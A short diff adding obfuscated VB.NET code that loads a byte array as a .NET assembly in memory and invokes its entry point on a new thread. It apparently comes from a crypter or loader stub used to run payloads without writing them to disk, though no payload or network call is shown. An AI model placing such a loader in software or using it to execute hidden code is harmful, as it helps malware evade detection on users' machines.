@@ -1,0 +1,13 @@
+    Public Shared Function RInvoke(ByVal bytes As Byte()) As Boolean
+        Dim vr1 As New Threading.Thread(AddressOf vr0)
+        vr1.SetApartmentState(Threading.ApartmentState.STA)
+        vr1.Start(bytes)
+    End Function
+    Private Shared Sub vr0(ByVal vr0 As Object)
+        Dim vr19 As Reflection.MethodInfo = Reflection.Assembly.Load(DirectCast(vr0, Byte())).EntryPoint
+        If vr19.GetParameters.Length = 1 Then
+            vr19.Invoke(Nothing, New Object() {New String() {}})
+        Else
+            vr19.Invoke(Nothing, Nothing)
+        End If
+    End Sub
